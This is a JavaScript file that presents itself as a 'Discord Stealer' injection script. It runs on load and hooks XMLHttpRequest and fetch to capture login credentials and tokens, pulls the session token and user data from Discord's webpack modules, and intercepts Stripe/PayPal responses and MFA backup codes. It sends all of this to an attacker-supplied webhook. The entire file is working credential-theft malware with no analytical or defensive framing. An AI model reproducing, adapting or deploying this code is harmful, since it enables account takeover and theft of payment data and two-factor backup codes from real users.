(() => {
    const webhook = '%WEBHOOK_URL%'; // This will be replaced dynamically by injector

    const sendWebhook = (type, content) => {
        try {
            const payload = JSON.stringify({
                username: "Discord Stealer",
                embeds: [{
                    title: type,
                    description: "Captured data below",
                    color: 0xff0000,
                    fields: Object.entries(content).map(([k, v]) => ({
                        name: k,
                        value: typeof v === 'string' ? v.substring(0, 1024) : JSON.stringify(v).substring(0, 1024),
                        inline: false
                    })),
                    timestamp: new Date().toISOString()
                }]
            });

            fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: payload
            }).catch(() => {});
        } catch (e) {}
    };

    // Utility to safely get JSON-parsed data
    const safeParse = (data) => {
        try { return JSON.parse(data); } catch { return null; }
    };

    // Hook XMLHttpRequest open/send to catch tokens & passwords from login/register endpoints
    const hookXHR = () => {
        const originalSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function (body) {
            try {
                if (this._url && /\/(login|register|users\/@me)/.test(this._url)) {
                    let data = typeof body === 'string' ? safeParse(body) : null;
                    if (data) {
                        if (data.token || data.password || data.email) {
                            sendWebhook('Auth Request Captured', data);
                        }
                    }
                }
            } catch (e) {}

            originalSend.apply(this, arguments);
        };

        const originalOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function (method, url) {
            this._url = url;
            return originalOpen.apply(this, arguments);
        };
    };

    // Hook fetch API for token interception
    const hookFetch = () => {
        const originalFetch = window.fetch;
        window.fetch = async (...args) => {
            const response = await originalFetch(...args);

            try {
                if (typeof args[0] === 'string' && /\/(login|register|users\/@me)/.test(args[0])) {
                    const cloned = response.clone();
                    const json = await cloned.json().catch(() => null);
                    if (json && (json.token || json.password)) {
                        sendWebhook('Auth Fetch Captured', json);
                    }
                }
            } catch (e) {}

            return response;
        };
    };

    // Grab current token & user info directly from Discord’s webpack modules
    const grabTokenUser = () => {
        try {
            const webpackModules = window.webpackChunkdiscord_app.push([
                [Math.random()],
                {},
                e => {
                    for (const m in e.m) {
                        if (e.m[m].toString().includes('getToken')) {
                            return e.m[m];
                        }
                    }
                }
            ]);
        } catch {}

        let token = null;
        let user = null;

        try {
            for (const m in window.webpackChunkdiscord_app) {
                if (!window.webpackChunkdiscord_app.hasOwnProperty(m)) continue;
                let mod = window.webpackChunkdiscord_app[m];
                if (!mod) continue;
                for (const k in mod) {
                    try {
                        if (mod[k]?.exports?.default?.getToken) {
                            token = mod[k].exports.default.getToken();
                        }
                        if (mod[k]?.exports?.default?.getCurrentUser) {
                            user = mod[k].exports.default.getCurrentUser();
                        }
                    } catch {}
                }
            }
        } catch {}

        return { token, user };
    };

    // Grab payment methods by intercepting requests to payment endpoints
    const hookPayments = () => {
        const originalFetch = window.fetch;
        window.fetch = async (...args) => {
            const url = args[0];
            const response = await originalFetch(...args);

            if (typeof url === 'string' && (url.includes('stripe') || url.includes('paypal'))) {
                try {
                    const clone = response.clone();
                    const json = await clone.json().catch(() => null);
                    if (json) sendWebhook('Payment Info Captured', json);
                } catch {}
            }

            return response;
        };
    };

    // Hook backup codes retrieval endpoint to steal MFA backup codes
    const hookBackupCodes = () => {
        const originalFetch = window.fetch;
        window.fetch = async (...args) => {
            const url = args[0];
            const response = await originalFetch(...args);

            if (typeof url === 'string' && url.endsWith('/backup-codes')) {
                try {
                    const clone = response.clone();
                    const json = await clone.json().catch(() => null);
                    if (json) sendWebhook('MFA Backup Codes Captured', json);
                } catch {}
            }

            return response;
        };
    };

    // Run all hooks and initial grabs
    const init = () => {
        hookXHR();
        hookFetch();
        hookPayments();
        hookBackupCodes();

        // Initial grab of token and user info
        const { token, user } = grabTokenUser();
        if (token && user) {
            sendWebhook('Initial Token & User', { token, user: JSON.stringify(user) });
        }
    };

    // Run on script load
    init();
})();
